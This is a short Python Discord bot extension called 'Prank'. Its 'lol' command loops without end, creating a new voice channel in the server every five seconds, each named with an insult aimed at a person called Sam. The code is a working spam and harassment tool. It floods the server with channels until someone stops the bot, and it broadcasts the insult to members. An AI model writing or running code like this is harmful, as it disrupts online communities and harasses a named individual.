import discord
from discord.ext import commands
import asyncio

class Prank():
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context=True)
    async def lol(self, ctx):
        server = ctx.message.server
        while True:
            await self.bot.create_channel(server, 'Sam is a twat', type=discord.ChannelType.voice)
            await asyncio.sleep(5)
            
        
def setup(bot):
    bot.add_cog(Prank(bot))
